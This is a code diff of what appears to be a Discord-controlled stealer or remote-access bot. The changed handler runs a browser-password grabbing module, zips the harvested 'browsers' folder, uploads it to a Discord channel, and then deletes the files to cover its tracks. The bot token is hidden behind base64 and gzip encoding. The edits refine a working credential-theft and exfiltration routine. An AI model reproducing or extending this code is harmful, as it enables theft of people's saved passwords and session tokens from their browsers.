@@ -479,15 +479,20 @@ async def on_message(message):
         #run token_grabber.pyw and wait until finished then send token.txt
         os.system(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
 
-        embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
+        embed = discord.Embed(title="Browser Grabber", description="Executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
         while(os.path.exists(f"{main_path}\\browsers") == False):
             time.sleep(1)
 
-        make_archive("browsers", "zip", f"{main_path}\\browsers")
+        make_archive(f"{main_path}\\browsers", "zip", f"{main_path}\\browsers")
+
+        while os.path.exists(f"{main_path}\\browsers.zip") == False:
+            time.sleep(1)
+
         await message.channel.send(file=discord.File(f"{main_path}\\browsers.zip"))
-        os.remove(f"{main_path}\\browsers.zip")
+        files.delete_dir(f"{main_path}\\browsers")
+        files.delete_file(f"{main_path}\\browsers.zip")
         os.remove(f"{main_path}\\browsers")
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
